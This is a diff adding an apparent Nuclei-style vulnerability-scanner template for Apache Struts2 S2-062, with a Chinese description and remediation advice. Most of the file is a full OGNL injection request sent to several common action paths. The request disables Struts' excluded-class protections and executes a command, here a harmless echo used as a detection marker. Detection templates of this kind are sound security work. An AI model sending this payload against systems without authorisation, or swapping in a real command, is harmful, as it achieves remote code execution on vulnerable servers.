@@ -1,0 +1,62 @@
+id: S2-062
+info:
+  name: Apache Struts2 S2-062 - Remote Code Execution
+  author:
+  - 折跃
+  description: |-
+    Struts2 S2-062 远程命令执行
+    此次 Apache Struts2 漏洞为 CVE-2020-17530 ( S2-061 )的修复不完整，导致输入验证不正确。
+    如果开发人员使用%{…} 语法进行强制 OGNL 解析，仍有一些特殊的 TAG 属性可以执行二次解析。对不受信任的用户输入使用强制 OGNL 解析可能会导致远程代码执行。
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+
+    #### 临时修复方案
+    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
+    2、可通过设置所有标签中value=" "来缓解此漏洞。
+    将org.apache.commons.collection.BeanMap添加至excludedClasses黑名单中
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,verify)
+  raw:
+  - |
+    POST {{tmpPath}} HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+    Content-Length: 1095
+
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+    Content-Disposition: form-data; name="id"
+
+    %{
+    (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+    (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+    (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+    (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
+    (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+    (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
+    (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+    (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+    (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'echo {{verify}}'}))
+    }
+
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF—
+  attack: clusterbomb
+  payloads:
+    tmpPath:
+    - /
+    - /index.action
+    - /login.action
+    - /default.action
+    - /admin.action
+    - /user.action
+  redirects: true
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
